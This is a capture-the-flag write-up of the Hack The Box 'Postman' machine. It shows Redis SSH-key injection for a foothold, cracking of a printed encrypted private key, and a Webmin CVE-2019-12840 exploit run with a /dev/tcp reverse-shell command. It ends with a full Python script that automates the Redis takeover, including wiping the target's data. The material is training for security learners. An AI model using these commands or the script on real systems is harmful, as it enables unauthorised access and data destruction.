## Default Information
IP Address: 10.10.10.160\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.160    postman.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.160 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-02 01:05:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.111
Discovered open port 80/tcp on 10.10.10.111
Discovered open port 6379/tcp on 10.10.10.111
Discovered open port 10000/tcp on 10.10.10.111
Discovered open port 10000/udp on 10.10.10.111
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.29 ((Ubuntu)) | Open |
| 6379	| redis | Redis key-value store 4.0.9 | Open |
| 10000	| HTTP | MiniServ 1.910 (Webmin httpd) | Open |

We also discovered that the service behind UDP port 10000
| Port Number | Service | Reason | State |
|-----|------------------|----------------------|----------------------|
| 10000	| webmin | udp-response ttl 63 (https on TCP port 10000) | open |

Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports. From the output, we discovered that port 80 might be vulnerable to SQL injection, while port 10000 might be vulnerbale to CVE-2006-3392

```
80/tcp    open  http             syn-ack ttl 63
|_http-sql-injection: 
|   Possible sqli for queries:
|     http://postman.htb:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://postman.htb:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://postman.htb:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://postman.htb:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://postman.htb:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://postman.htb:80/js/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://postman.htb:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|_    http://postman.htb:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.exploit-db.com/exploits/1997/
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://postman.htb

```
http://postman.htb/images               (Status: 301) [Size: 311] [--> http://postman.htb/images/]
http://postman.htb/upload               (Status: 301) [Size: 311] [--> http://postman.htb/upload/]
http://postman.htb/css                  (Status: 301) [Size: 308] [--> http://postman.htb/css/]
http://postman.htb/js                   (Status: 301) [Size: 307] [--> http://postman.htb/js/]
http://postman.htb/fonts                (Status: 301) [Size: 310] [--> http://postman.htb/fonts/]
http://postman.htb/server-status        (Status: 403) [Size: 299]
```

Next, we will try to use Gobuster to do an enumeration for common files extensions such as .js,.txt,.php and .html.

```
http://postman.htb/index.html           (Status: 200) [Size: 3844]
http://postman.htb/upload               (Status: 301) [Size: 311] [--> http://postman.htb/upload/]
http://postman.htb/css                  (Status: 301) [Size: 308] [--> http://postman.htb/css/]
http://postman.htb/js                   (Status: 301) [Size: 307] [--> http://postman.htb/js/]
http://postman.htb/fonts                (Status: 301) [Size: 310] [--> http://postman.htb/fonts/]
http://postman.htb/server-status        (Status: 403) [Size: 299]
```
### Autorecon

From the outputs of autorecon, we are able to determine the configurations of the server

```
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:637
run_id:73c691791a8db843715eabdd643e2037b9c304df
tcp_port:6379
uptime_in_seconds:7860
uptime_in_days:0
hz:10
lru_clock:7430281
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```
### Redis enumeration

We shall first check if this redis server can be accessed while authenticated. From the output, we are able to view the keys of the redis server while we are unauthenticated. This provides a possible point of exploitation as we can access the redis server while authenticated and carry out malicious actions. We are also able to know that we have a user ```redis``` in this server.

```
┌──(kali㉿kali)-[~]
└─$ redis-cli -h 10.10.10.160 -p 6379
10.10.10.160:6379> keys *
(empty array)
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis"
```

### Web-content discovery

Exploring http://postman.htb:80 does not yield any desirable results. Navigating to http://postman.htb:10000 on the other hand, points us to another endpoint which is https://Postman:10000/

![Image of website at port 10000](https://github.com/joelczk/writeups/blob/main/HTB/Images/Postman/port10000.PNG)

Next we will add the new endpoint to our /etc/hosts fil

```
10.10.10.160    postman.htb postman
```

Lastly, we will enumerate the endpoints on https://postman:10000 with Gobuster.

## Exploit
### RCE via redis
Firstly, we will create our own ssh public-private key pair using ```ssh-keygen -t rsa ```. Next, we will write our public-private keypair to a file and import the file into redis
```
┌──(kali㉿kali)-[~/Desktop/postman]
└─$ (echo -e "\n\n"; cat rsa.pub; echo -e "\n\n") > spaced_key.txt
                                                                                           
┌──(kali㉿kali)-[~/Desktop/postman]
└─$ cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key                  148 ⨯ 1 ⚙
OK
```

Afterwards, we will save the public key that we have imported into the _authorized_key_ file on the redis server
```
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis"
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> 
```

Finally, we will be able to gain access to the redis server via SSH.
```
┌──(kali㉿kali)-[~/Desktop/postman]
└─$ ssh -i rsa redis@10.10.10.160
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:
```

### Privilege Escalation to Matt

However, we realize that we do not have the permissions to view the user flag. Hence, we would need to escalate our privileges to Matt

```
redis@Postman:/home$ cd
redis@Postman:~$ cd /home/Matt
redis@Postman:/home/Matt$ ls
user.txt
redis@Postman:/home/Matt$ cat user.txt
cat: user.txt: Permission denied
redis@Postman:/home/Matt$ 
```

Executing our LinEnum script, we discover a suspicious file /opt/id_rsa.bak belonging to Matt

![id_rsa file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Postman/id_rsa.PNG)

Upon furthur inspection, we realize that this is a private key belonging to Matt.

```
redis@Postman:~$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

To crack this private key, we will first have to obtain the hash of the private key using ssh2john

```
┌──(kali㉿kali)-[~/Desktop/postman]
└─$ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
┌──(kali㉿kali)-[~/Desktop/postman]
└─$ python ssh2john.py matt.key > matt.hash  
```

Lastly, we will use John The Ripper to obtain the password from the private key. From the output, the password to ssh into the user, Matt is ```computer2008```

```
┌──(kali㉿kali)-[~/Desktop/postman]
└─$ john --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt matt.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (matt.key)
1g 0:00:00:00 DONE (2021-10-22 12:10) 2.777g/s 1672Kp/s 1672Kc/s 1672KC/s percing..peque
Session completed
                                                                                             
┌──(kali㉿kali)-[~/Desktop/postman]
└─$ john --show matt.hash                                                    
matt.key:computer2008

1 password hash cracked, 0 left
```

However, we realize that when we try to SSH on our local machine, the connection is closed by the host

```
┌──(kali㉿kali)-[~/Desktop/postman]
└─$ ssh -i matt.key matt@10.10.10.160                                                    1 ⚙
Enter passphrase for key 'matt.key': 
Connection closed by 10.10.10.160 port 22
```

We will try to escalate the privilege from the ```redis``` user. We have successfully gained access to Matt's SSH terminal. Now, all we have to do is to obtain the user's flag.

```
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$
```

### Obtaining user flag
```
Matt@Postman:/var/lib/redis$ cat /home/Matt/user.txt
<Redacted user flag>
Matt@Postman:/var/lib/redis$
```

### Accessing webmin web portal
Viewing the contents at /etc/webmin, we discover that there is an ACL file for Matt. This tells us that Matt might be one of the verified users for the webmin portal.

![ACL for Matt](https://github.com/joelczk/writeups/blob/main/HTB/Images/Postman/webmin.PNG)

Using ```Matt:computer2008```, we are able to login to the web interface of webmin. From the homepage, we are also able to determine the version of webmin used.

![Webmin version used](https://github.com/joelczk/writeups/blob/main/HTB/Images/Postman/webmin_version.PNG)

### Creating a reverse shell

From the version, we realize that this version of Webmin is vulnerable to CVE-2019-12840. We will download an exploit code from [here](https://github.com/bkaraceylan/CVE-2019-12840_POC/blob/master/exploit.py) and execute the exploit.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/CVE-2019-12840_POC]
└─$ python3 exploit.py -u https://postman -p 10000 -U Matt -P computer2008 -c "/bin/bash -l > /dev/tcp/10.10.16.7/5000 0<&1 2>&1"
[*] Attempting to login...
[*] Exploiting...
[*] Executing payload...
```

We would then obtain a reverse shell in our listener. All we have to do is to stabilize the reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 5000
listening on [any] 5000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.160] 33710
mesg: ttyname failed: Inappropriate ioctl for device
python -c 'import pty; pty.spawn("/bin/bash")'
root@Postman:/usr/share/webmin/package-updates/# export TERM=xterm
export TERM=xterm
root@Postman:/usr/share/webmin/package-updates/# stty cols 132 rows 34
stty cols 132 rows 34
root@Postman:/usr/share/webmin/package-updates/#
```
### Obtaining root flag

```
root@Postman:/usr/share/webmin/package-updates# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
root@Postman:/usr/share/webmin/package-updates# 
```

## Post-Exploitation
### CVE-2019-15107
During the exploitation phase, we also realize that https://Postman:10000 might be vulnerable to CVE-2019-15107, but this could not be exploited as password changing is not enabled on this site

![Password changing not enabled](https://github.com/joelczk/writeups/blob/main/HTB/Images/Postman/password_changing.PNG)


### Redis RCE
Wrote a python script to automate redis RCE

```python
import subprocess
import os
import paramiko
import time
import logging
import argparse

logging.basicConfig(filename='run.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s',level=logging.INFO)
	
def checkAuthentication(host, port):
	print("[+] Trying to connect to Redis server at {host}:{port}".format(host=host,port=port))
	command = "redis-cli -h {host} -p {port} keys '*'".format(host=host, port=port)
	output = subprocess.check_output(command,shell=True).decode()
	logging.info("Redis check authentication: {output}".format(output=output))
	if "NOAUTH Authentication required." in output:
		print("[-] Redis server requires authentication!")
		return False
	else:
		print("[+] Redis server does not require authentication!")
		return True

def checkVersion(host,port):
	print("[+] Obtaining configuration information from redis server..")
	command = "redis-cli -h {host} -p {port} INFO".format(host=host, port=port)	
	output = subprocess.check_output(command,shell=True).decode().split("\n")
	logging.info("Redis check version: {output}".format(output=output))
	for x in output:
		if ("redis_version" in x) or ("redis_build_id" in x) or ("os" in x) or ("gcc_version" in x) or ("config_file" in x) or ("arch_bits:64" in x) or ("avg_ttl" in x):
			print("    {x}".format(x=x))
		else:
			continue

def getKeys(host,port):
	print("[+] Obtaining keys from redis server...")
	command = "redis-cli -h {host} -p {port} keys '*'".format(host=host, port=port)	
	output = subprocess.check_output(command,shell=True).decode().strip().split("\n")
	logging.info("Redis get keys command: {output}".format(output=output))
	count = 1
	if output[0] == '':
		print("    There are currently no keys in the redis server")
		return
	for x in output:
		print("    {count}){x}".format(count=count,x=x))
		count += 1

def checkExecuteCommands(host, port):
	command = "redis-cli -h {host} -p {port} system.exec 'id'".format(host=host, port=port)	
	output = subprocess.check_output(command,shell=True).decode()
	logging.info("Redis check system.exec command: {output}".format(output=output))
	if "ERR unknown command" in output:
		print("[-] Unable to execute commands via system.exec")
	else:
		reverse_command = "redis-cli -h 10.10.10.160 -p 6379 system.exec '/bin/bash -l > /dev/tcp/<IP Address>/<Port> 0<&1 2>&1'"
		print("[+] Able to execute commands via system.exec")
		print("[+] Possible reverse shell can be executed: {reverse_command}".format(reverse_command=reverse_command))

def generateSSHKeys():
	currentDirectory = os.getcwd()
	os.system('mkdir ssh')
	print("    Creating new folder at {currentDirectory}".format(currentDirectory=currentDirectory))
	newDirectory = currentDirectory + "/ssh"
	os.chdir(newDirectory)
	keyGenFileName = "id_rsa"
	print("    Creating a new SSH public key...")
	keyGenCommand = "ssh-keygen -t rsa -C \'acid_creative\' -f {keyGenFileName} -q -P ''".format(keyGenFileName=keyGenFileName)
	subprocess.check_output(keyGenCommand, shell=True)
	convertKeyToTextFileCommand = "(echo '\r\n\'; cat {keyGenFileName}.pub; echo  \'\r\n\') > spaced_key.txt".format(keyGenFileName=keyGenFileName)
	print("    Writing public key to spaced_key.txt...")	
	subprocess.check_output(convertKeyToTextFileCommand,shell=True)
		
def checkRedisRCE(host,port):
	print("[+] Testing RCE for redis server...")
	generateSSHKeys()
	username = "redis"
	key_file = os.getcwd() + "/id_rsa"
	print("    Flushing all external configurations...")
	flushAllCommand = "redis-cli -h {host} -p {port} flushall".format(host=host, port=port)	
	flushAllCommandOutput = subprocess.check_output(flushAllCommand,shell=True).decode()
	logging.info('Redis flushall command: {output}'.format(output=flushAllCommandOutput))
	print("    Importing key file into redis server...")
	importKeyCommand = "cat spaced_key.txt | redis-cli -h {host} -x set ssh_key".format(host=host)
	importKeyOutput = subprocess.check_output(importKeyCommand,shell=True).decode()
	logging.info("Redis import key: {output}".format(output=importKeyOutput))
	setDirCommand = "redis-cli -h {host} -p {port} config set dir /var/lib/redis/.ssh".format(host=host,port=port)
	setDbCommand = "redis-cli -h {host} -p {port} config set dbfilename 'authorized_keys'".format(host=host,port=port)
	setSaveCommand = "redis-cli -h {host} -p {port} save".format(host=host,port=port)
	print("    Setting directory on redis server to /var/lib/redis/.ssh...")
	saveDirOutput = subprocess.check_output(setDirCommand,shell=True).decode()
	logging.info("Redis set directory output: {output}".format(output=saveDirOutput))
	print("    Setting dbfilename on redis server...")
	setDbOutput = subprocess.check_output(setDbCommand,shell=True).decode()
	logging.info("Redis set DB filename: {output}".format(output=setDbOutput))
	print("    Saving private keys to redis server...")
	setSaveOutput = subprocess.check_output(setSaveCommand,shell=True).decode()
	logging.info("Redis save private keys: {output}".format(output=setSaveOutput))
	if testSSHConnection(host,port,username,key_file) == True:
		print("    - SSH Connection successful!")
		print("    - SSH Command : ssh -i id_rsa {username}@{host}".format(username=username,host=host))
		print("[+] RCE on redis server succeeded!") 
	else:
		print("[-] RCE on redis server failed!")
	
	

def testSSHConnection(host,port,username,key_file):
	print("    Testing SSH connection...")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	time.sleep(5)
	try:
	    ssh.connect(host, username=username, key_filename=key_file)
	    return True
	except Exception as e:
	    print ("[-] An error has occured! Please check run.log")
	    logging.error("Exception occured during SSH connection", exc_info=True)
	    return False

def logic(host,port):
	try:
		checkVersion(host,port)
		getKeys(host,port)
		checkExecuteCommands(host,port)
		checkRedisRCE(host,port)
	except Exception as e:
		print("[-] An error has occured!")
		logging.error("An exception has occured in logic method",exc_info=True)
		
def main(host,port):
	if checkAuthentication(host,port) == True:
		logic(host,port)
	else:
		return
		
if __name__ == '__main__':
	os.system("rm -rf ssh")
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--ip', help='IP address of redis server')
	parser.add_argument('-p', '--port', help='Port of redis server')
	args = parser.parse_args()
	main(args.ip,args.port)
```
